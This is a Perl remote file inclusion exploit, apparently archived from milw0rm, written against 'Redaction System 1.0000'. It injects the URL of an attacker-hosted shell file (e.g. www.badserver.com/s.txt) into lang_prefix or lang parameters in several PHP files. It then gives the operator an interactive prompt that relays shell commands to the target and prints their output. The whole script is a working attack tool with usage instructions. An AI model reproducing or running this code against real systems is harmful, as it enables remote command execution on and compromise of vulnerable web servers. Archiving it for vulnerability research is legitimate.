#!/usr/bin/perl

use LWP::UserAgent;

$target = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];
$fileno = @ARGV[3];

if(!$target || !$shellsite)
{
    usage();
}

header();

if ($fileno eq 1)
{
    $file = " conn.php?lang_prefix=";
}
elsif ($fileno eq 2)
{
    $file = "index.php?lang=";
}
elsif ($fileno eq 3)
{
    $file = "sesscheck.php?lang_prefix=";
}
elsif ($fileno eq 4)
{
    $file = "wap/conn.php?lang_prefix=";
}
elsif ($fileno eq 5)
{
    $file = "wap/sesscheck.php?lang_prefix=";
}
else
{
    $file = "conn.php?lang_prefix=";
}

while()
{
    print "[cmd]\$";
    while (<STDIN>)
    {
        $cmd = $_;
        chomp($cmd);
print $target.'/'.$file.'='.$shellsite.'?&'.$shellcmd.'='.$cmd;
        $xpl = LWP::UserAgent->new() or die;
        $req = HTTP::Request->new(GET=>$target.'/'.$file.'='.$shellsite.'?&'.$shellcmd.'='.$cmd) or die("\n\n Failed to connect.");
        $res = $xpl->request($req);
        $rp = $res->content;
        $rp =~ tr/[\n]/[&#234;]/;
print $rp;
        if (!cmd)
        {
            print "\nEnter command: \n";
            $rp = "";
        }
        elsif ($rp=~/failed to open stream: HTTP request failed!/ || $rp=~/: Cannot execute a blank command in <b>/)
        {
            print "\nUnable to connect to Shellsite, or invalid command variable\n";
            exit;
        }
        elsif ($rp=~/^<br.\/>.<b>Warning/)
        {
            print "\nInvalid Command\n\n";
            exit;
        }
       
        if ($rp=~ /(.+)<br.\/>.<b>Warning.(.+)<br.\/>.<b>Warning/)
        {
            $final = $1;
            $final=~ tr/[&#234;]/[\n]/;
            print "\n$final\n";
        }
        else
        {
            print "[cmd]\$ ";
        }
    }
}

sub header()
{
    print q
    {
######################################################################
       Redaction System 1.0000 - Remote Include Exploit
        Vulnerability discovered and exploit by r0ut3r
               writ3r@gmail.com
          Special thanks to Warpboy's perl tutorial
             http://milw0rm.com/papers/85
######################################################################
    };
}

sub usage()
{
header();
    print q
    {
######################################################################
Usage:
perl rs_xpl.pl <Target website> <Shell Location> <CMD Variable> <No>
<Target Website> - Path to target eg: www.rsvuln.target.com
<Shell Location> - Path to shell eg: www.badserver.com/s.txt
<CMD Variable> - Shell command variable name eg: cmd
<No> - File number, corresponding to:
1: conn.php
2: index.php
3: sesscheck.php
4: wap/conn.php
5: wap/sesscheck.php
######################################################################
    };
exit();
}

# milw0rm.com [2006-10-12]
